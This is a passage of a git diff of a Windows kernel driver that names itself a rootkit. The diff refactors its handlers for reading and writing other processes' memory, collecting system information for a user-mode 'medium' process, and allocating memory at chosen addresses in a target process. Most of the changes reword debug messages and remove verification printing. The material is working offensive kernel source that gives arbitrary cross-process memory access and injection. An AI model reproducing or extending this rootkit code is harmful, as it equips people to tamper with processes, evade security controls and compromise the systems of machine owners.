-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT ALLOCATE KERNEL MODE BUFFER TO GET USERMODE SOURCE BUFFER\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot allocate buffer for writing source)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
-	if (!NT_SUCCESS(status)) {
+	Status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
+	if (!NT_SUCCESS(Status)) {
 		if (WasCommitted) {
 			general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - CANNOT GET USERMODE SOURCE BUFFER INTO KERNEL MODE SOURCE BUFFER\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy writing source into buffer)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	// Print source usermode buffer value (as a string) to verify UM-KM -
-	TempBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 0x76547654);
-	if (TempBuffer != NULL) {
-		RtlCopyMemory(TempBuffer, SourceBuffer, WriteSize);
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE (%s)\n", (char*)TempBuffer);
-		ExFreePool(TempBuffer);
-	}
-	else {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCCEEDED GETTING SOURCE USERMODE BUFFER INTO KERNELMODE, CANNOT ALLOCATE MEMORY FOR PRINTING BUFFER\n");
-	}
 
-
-	// Copying from UM-UM/REG-UM -
-	status = KernelToUserMEM(EpTo, SourceBuffer, WriteToAddr, WriteSize, FALSE);
+	// Copying from UM-UM/REG-UM:
+	Status = KernelToUserMEM(EpTo, SourceBuffer, WriteToAddr, WriteSize, FALSE);
 	if (WasCommitted) {
 		general::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
 	}
 	ExFreePool(SourceBuffer);
 
-	if (!NT_SUCCESS(status)) {
-		if (strcmp(RootkInst->MdlName, "regular") != 0) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM REG-UM\n");
-		}
-		else {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - GetKernelToUser FAILED WHEN COPYING FROM KM-UM/UM-UM\n");
-		}
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy local KM source buffer into UM destination memory)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	if (strcmp(RootkInst->MdlName, "regular") != 0) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, KM-UM/UM-UM)\n");
-	}
-	else {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST SUCEEDED (GetKernelToUser, REG-UM)\n");
-	}
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory succeeded\n");
 	return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
@@ -377,102 +374,89 @@ NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 
 
 NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST\n");
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory\n");
 	PEPROCESS EpFrom;
 	PEPROCESS EpTo;
 	NTSTATUS status;
 	KAPC_STATE SrcState;
 	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
-
 	PVOID ReadToAddr = RootkInst->Out;
 	PVOID ReadFromAddr = RootkInst->Buffer;
 	ULONG64 ReadSize = RootkInst->Size;
 	SIZE_T AllocSize = ((ReadSize / PAGE_SIZE) + 1) * PAGE_SIZE;
 	PVOID SourceBuffer = NULL;
-	PVOID TempBuffer = NULL;
 
-	// Check for invalid arguments -
-	if (!RootkInst->Buffer || !RootkInst->Out || !RootkInst->Size) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - INVALID ARGS SIZE (%zu)/SOURCE BUFFER (%p)/OUTPUT BUFFER (%p)\n", RootkInst->Size, RootkInst->Buffer, RootkInst->Out);
+
+	// Check for invalid arguments:
+	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more parameters are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Check for KM addresses (not allowed for this function) -
+	// Check for KM addresses (not allowed for this function):
 	if ((ULONG64)RootkInst->Out >= general::GetHighestUserModeAddrADD() || (ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING WRITE REQUEST FAILED - ONE OR MORE OF THE BUFFERS ARE IN SYSTEMSPACE (SOURCE BUFFER (%p)/OUTPUT BUFFER (%p))\n", RootkInst->Buffer, RootkInst->Out);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more addresses are in KM: %p, %p)\n", RootkInst->Buffer, RootkInst->Out);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Get destination process EPROCESS to write into it -
+	// Destination process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
-		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING DESTINATION EPROCESS (%hu)\n", RootkInst->SemiPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get destination process %hu EPROCESS)\n", RootkInst->SemiPID);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
-	// source process EPROCESS -
+	// Source process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom))) {
-		DbgPrintEx(0, 0, "KMDFdriver BEFORE READ REQUEST FROM USER MODE - CANNOT GET READING SOURCE EPROCESS (%hu)\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get source process %hu EPROCESS)\n", RootkInst->MainPID);
 		return general::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-	DbgPrintEx(0, 0, "KMDFdriver PERFORMING READ REQUEST FROM USER MODE\n");
 
 
-	// Verify the source address and the memory region -
+	// Verify the source address and the memory region:
 	__try {
-		KeStackAttachProcess(EpFrom, &SrcState);  // attach to the source process
+		KeStackAttachProcess(EpFrom, &SrcState);
 		ProbeForRead(ReadFromAddr, AllocSize, sizeof(UCHAR));
 		status = ZwQueryVirtualMemory(ZwCurrentProcess(), ReadFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
 		if (!NT_SUCCESS(status)) {
 			KeUnstackDetachProcess(&SrcState);
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - CANNOT QUERY TO VERIFY SOURCE\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot query source memory from process %hu to verify if can read)\n", RootkInst->MainPID);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		KeUnstackDetachProcess(&SrcState);  // detach from the source buffer
-
+		KeUnstackDetachProcess(&SrcState);
 		if (!(FromInfo.State & MEM_COMMIT)) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION IS NOT COMMITTED, NOTHING TO READ\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region from process %hu is not committed, nothing to read)\n", RootkInst->MainPID);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
-		// If reading parameters are out of range: use allocation base -
+
+		// If reading parameters are out of range - use allocation base:
 		if ((ULONG64)ReadFromAddr + ReadSize > (ULONG64)FromInfo.AllocationBase + FromInfo.RegionSize) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CHANGING READING ADDRESS FROM %p TO %p (ReadFromAddr + ReadSize IS OUT OF RANGE OF REGION)\n", ReadFromAddr, FromInfo.AllocationBase);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory, changing reading address from %p to %p (original address + size is out of range)\n", ReadFromAddr, FromInfo.AllocationBase);
 			ReadFromAddr = FromInfo.AllocationBase;
 		}
 		RootkInst->Buffer = ReadFromAddr;
-
 		if (FromInfo.RegionSize < AllocSize) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE MEMORY REGION SIZE (%zu) < REQUESTED SIZE (%zu)\n", FromInfo.RegionSize, AllocSize);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region size %zu < requested size %zu)\n", FromInfo.RegionSize, AllocSize);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
-		// Allocate source buffer -
-		SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 0X45674567);
+
+		// Allocate source buffer:
+		SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 'RqRs');
 		if (SourceBuffer == NULL) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - LOCAL KERNELMODE SOURCE BUFFER = NULL\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot allocate memory for KM source buffer)\n");
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 
-		// Get source buffer -
+
+		// Get source buffer:
 		status = UserToKernelMEM(EpFrom, ReadFromAddr, SourceBuffer, ReadSize, FALSE);
 		if (!NT_SUCCESS(status)) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - COPYING SOURCE USERMODE TO KERNELMODE LOCAL BUFFER FAILED\n");
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy into source buffer from source memory)\n");
 			ExFreePool(SourceBuffer);
 			return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
-		}
-
-		// Try to verify the passing of the right values -
-		TempBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 0x76547654);
-		if (TempBuffer == NULL) {
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - CANNOT ALLOCATE MEMORY FOR VERIFICATION TEMPORARY BUFFER\n");
-		}
-		else {
-			RtlCopyMemory(TempBuffer, SourceBuffer, ReadSize);
-			DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST UPDATE - VERIFICATION TEMPORARY BUFFER VALUE: %s\n", (char*)TempBuffer);
-			ExFreePool(TempBuffer);
 		}
 	}
 	__except (STATUS_ACCESS_VIOLATION) {
@@ -480,144 +464,121 @@ NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
 		if (SourceBuffer != NULL) {
 			ExFreePool(SourceBuffer);
 		}
-		if (TempBuffer != NULL) {
-			ExFreePool(TempBuffer);
-		}
-		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - SOURCE VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (access violation system exception when querying source memory region/s)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Copy from local KM buffer to the destination UM buffer -
+	// Copy from local KM buffer to the destination UM buffer:
 	status = KernelToUserMEM(EpTo, SourceBuffer, ReadToAddr, ReadSize, FALSE);
 	ExFreePool(SourceBuffer);
-
 	if (!NT_SUCCESS(status)) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST FAILED - GetKernelToUser FAILED\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy source KM buffer into destination memory region/s)\n");
 		return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
 	}
-
-	DbgPrintEx(0, 0, "KMDFdriver CALLING READ REQUEST SUCCEEDED - GetKernelToUser SUCCEEDED\n");
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory succeeded\n");
 	return general::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
 
 
 
 
-NTSTATUS PrintDbgMsgRK(ROOTKIT_MEMORY* RootkInst)
-{
-	DbgPrintEx(0, 0, "KMDFdriver PRINT MESSAGE REQUEST\n");
-	DbgPrintEx(0, 0, "KMDFdriver Message: (%s)\n", RootkInst->MdlName);
-	return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
-}
-
-
-
-
 NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST\n");
-	DbgPrintEx(0, 0, "KMDFdriver CALLING PART1 SYSTEMINFO REQUEST\n");
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information\n");
 	PEPROCESS Process = { 0 };
 	RKSYSTEM_INFORET SysInfoRet = { 0 };
 	KAPC_STATE PrcState = { 0 };
 	RKSYSTEM_INFORMATION_CLASS CurrInf = { SystemBasicInformation, NULL, ROOTKSTATUS_QUERYSYSINFO, NULL };
-	ULONG64 TotalRequests = strlen(RootkInst->MdlName);
+	ULONG64 TotalRequests = (RootkInst->Size / sizeof(RKSYSTEM_INFORMATION_CLASS));
 	SIZE_T InfoSize = 0;
 	ULONG64 InfoOffs = 0;
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PVOID LocalSysinf = NULL;
 	PVOID PrcInf = NULL;
 
-	// Check for invalid arguments -
+
+	// Check for invalid arguments:
 	if (RootkInst->MainPID == 0 || RootkInst->Buffer == NULL) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - INVALID PID OF MainMedium.exe (%hu)/ ATTRIBUTE BUFFER = NULL\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (one or more invalid arguments: %hu, %p)\n", RootkInst->MainPID, RootkInst->Buffer);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Process EPROCESS -
+	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot get medium EPROCESS)\n");
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Check for KM address (not allowed for this function) -
+	// Check for KM address (not allowed for this function):
 	if ((ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - ATTRIBUTE BUFFER ADDRESS IS IN SYSTEMSPACE (%p)\n", RootkInst->Buffer);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (attribute buffer is in systemspace; %p)\n", RootkInst->Buffer);
 		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Iterate through the system info requests for part 1 (get each infotype from types buffer, query for system information and save the results in the original buffer) -
+	// Iterate through the system info requests for part 1 (get each infotype from types buffer, query for system information and save the results in the original buffer):
 	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST NUMBER %llu:\n", AttrOffs / sizeof(CurrInf));
-		status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
-		if (!NT_SUCCESS(status)) {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - UserToKernelMEM DID NOT SUCCEED (CANNOT DISPLAY INFOTYPE - COULD NOT RECEIVE IT)\n", AttrOffs / sizeof(CurrInf));
+		Status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (cannot get attributes of request)\n", AttrOffs / sizeof(CurrInf));
 			CurrInf.InfoSize = 0;
 			CurrInf.PoolBuffer = NULL;
 			CurrInf.ReturnStatus = ROOTKSTATUS_COPYFAIL;
 		}
 		else {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu UPDATE - UserToKernelMEM SUCCEEDED, QUERYING FOR SYSTEM INFORMATION (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
-			SysInfoRet = requests::RequestSystemInfoADD(CurrInf.InfoType, (ULONG64)CurrInf.ReturnStatus, (DWORD)(AttrOffs / sizeof(CurrInf) + 1));
+			SysInfoRet = requests::RequestSystemInfoADD(CurrInf.InfoType, (ULONG64)CurrInf.ReturnStatus);
 			CurrInf.PoolBuffer = SysInfoRet.Buffer;  // NULL = function failed, non-NULL = function succeeded
 			CurrInf.InfoSize = (ULONG)SysInfoRet.BufferSize;  // 0 = function failed, >0 = function succeeded
 
 			if (SysInfoRet.Buffer == NULL && SysInfoRet.BufferSize == 0) {
-				DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - RequestSystemInfoADD DID NOT SUCCEED (RETURNED A NULL POOL POINTER, INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (system information request returned NULL for the pool pointer - failed)\n", AttrOffs / sizeof(CurrInf));
 				CurrInf.ReturnStatus = ROOTKSTATUS_QUERYSYSINFO;
 			}
 			else {
-				DbgPrintEx(0, 0, "REQUEST NUMBER %llu SUCCESS - RequestSystemInfoADD SUCCEEDED (POOLBUFFER = %p, INFOSIZE = %llu, INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), SysInfoRet.Buffer, SysInfoRet.BufferSize, (ULONG64)CurrInf.InfoType);
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu succeeded\n", AttrOffs / sizeof(CurrInf));
 				CurrInf.ReturnStatus = ROOTKSTATUS_SUCCESS;
 				InfoSize += CurrInf.InfoSize;
 			}
 		}
-		status = KernelToUserMEM(Process, &CurrInf, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), sizeof(CurrInf), FALSE);
-		if (!NT_SUCCESS(status)) {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FINAL UPDATE - KernelToUserMEM FAILED TO RETURN RKSYSTEM_INFORMATION_CLASS FOR THE REQUEST (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
-		}
-		else {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FINAL UPDATE - KernelToUserMEM SUCCEEDED TO RETURN RKSYSTEM_INFORMATION_CLASS FOR THE REQUEST (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
+		Status = KernelToUserMEM(Process, &CurrInf, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), sizeof(CurrInf), FALSE);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed to return operation results for ther request\n", AttrOffs / sizeof(CurrInf));
 		}
 	}
 
 
-	// Allocate local system info buffer -
-	LocalSysinf = ExAllocatePoolWithTag(NonPagedPool, InfoSize, 0x9f9f9ff9);
+	// Allocate local system info buffer:
+	LocalSysinf = ExAllocatePoolWithTag(NonPagedPool, InfoSize, 'RqSi');
 	if (!LocalSysinf) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT ALLOCATE BUFFER FOR LOCAL SYSINFO (INFOSIZE = %zu) :(\n", InfoSize);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for local information buffer)\n");
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Allocate system info buffer in process -
+	// Allocate system information buffer in process:
 	KeStackAttachProcess(Process, &PrcState);
 	PrcInf = general::AllocateMemoryADD(NULL, ((InfoSize / PAGE_SIZE) + 1) * PAGE_SIZE, &PrcState, 0);
 	if (PrcInf == NULL) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT ALLOCATE BUFFER IN PROCESS FOR SYSINFO :(\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for information in medium process)\n");
 		ExFreePool(LocalSysinf);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Iterate through the system info requests from part 1 to copy all the information into one local buffer -
+	// Iterate through the system info requests to copy all the information into one local buffer:
 	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION AFTER PART 1 REQUEST NUMBER %llu:\n", AttrOffs / sizeof(CurrInf));
-		status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
-		if (!NT_SUCCESS(status)) {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - UserToKernelMEM DID NOT SUCCEED (CANNOT DISPLAY INFOTYPE - COULD NOT RECEIVE IT)\n", AttrOffs / sizeof(CurrInf));
+		Status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
+		if (!NT_SUCCESS(Status)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (cannot get request results information into local KM space)\n", AttrOffs / sizeof(CurrInf));
 		}
 		else {
-			DbgPrintEx(0, 0, "REQUEST NUMBER %llu UPDATE - UserToKernelMEM SUCCEEDED, QUERYING FOR SYSTEM INFORMATION (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
 			if (CurrInf.PoolBuffer == NULL || CurrInf.InfoSize == 0) {
-				DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - PART 1 DID NOT SUCCEED (SIZE = 0 / BUFFER = NULL)\n", AttrOffs / sizeof(CurrInf));
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (actual request failed - InfoSize = 0, PoolBuffer = NULL)\n", AttrOffs / sizeof(CurrInf));
 			}
 			else {
-				DbgPrintEx(0, 0, "REQUEST NUMBER %llu SUCCESS - PART 1 DID SUCCEEDED (SIZE = %zu / BUFFER = %p)\n", AttrOffs / sizeof(CurrInf), (SIZE_T)CurrInf.InfoSize, CurrInf.PoolBuffer);
+				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu succeeded when requesting earlier and copied results\n", AttrOffs / sizeof(CurrInf));
 				RtlCopyMemory((PVOID)((ULONG64)LocalSysinf + InfoOffs), CurrInf.PoolBuffer, CurrInf.InfoSize);
 				InfoOffs += CurrInf.InfoSize;
 			}
@@ -625,15 +586,15 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 	}
 
 
-	// Copy the system information from local KM buffer into a UM buffer (part 2) -
-	status = KernelToUserMEM(Process, LocalSysinf, PrcInf, InfoSize, FALSE);
+	// Copy the system information from local KM buffer into a UM buffer:
+	Status = KernelToUserMEM(Process, LocalSysinf, PrcInf, InfoSize, FALSE);
 	ExFreePool(LocalSysinf);
 
-	if (!NT_SUCCESS(status)) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - KernelToUserMEM FAILED TO RETURN SYSTEM INFORMATION BUFFER\n");
+	if (!NT_SUCCESS(Status)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (failed to copy actual information buffer into medium process)\n");
 		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_COPYFAIL, STATUS_SUCCESS, RootkInst);
 	}
-	DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST SUCCESS - KernelToUserMEM SUCCEEDED TO RETURN SYSTEM INFORMATION BUFFER\n");
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information succeeded\n");
 	RootkInst->Out = PrcInf;
 	RootkInst->Size = InfoSize;
 	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
@@ -643,48 +604,44 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
 
 
 NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST\n");
-
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process\n");
 	PEPROCESS Process = { 0 };
 	KAPC_STATE PrcState = { 0 };
-	MEMORY_BASIC_INFORMATION mbi = { 0 };
-
+	MEMORY_BASIC_INFORMATION MemoryBasic = { 0 };
 	PVOID InitialAddress = RootkInst->Buffer;
 	ULONG64 RequestedSize = RootkInst->Size;
 	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
 	SIZE_T AllocSize = ((RequestedSize / PAGE_SIZE) + 1) * PAGE_SIZE;
 
-	// Check for invalid arguments -
-	if (!InitialAddress || !RequestedSize) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - INVALID ARGS SIZE (%zu)/INITIAL ADDRESS (%p)\n", RequestedSize, InitialAddress);
+
+	// Check for invalid arguments:
+	if (InitialAddress == NULL || RequestedSize == NULL) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (one or more invalid parameters: %p, %zu)\n", InitialAddress, RequestedSize);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Check for KM address (not allowed for this function) -
+	// Check for KM address (not allowed for this function):
 	if ((ULONG64)InitialAddress >= general::GetHighestUserModeAddrADD()) {
-		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - THE ADDRESS IS IN SYSTEMSPACE (%p)\n", InitialAddress);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Allocate memory in process failed (the allocation address %p is in systemspace)\n", InitialAddress);
 		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
-	// Process EPROCESS -
+	// Process EPROCESS:
 	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
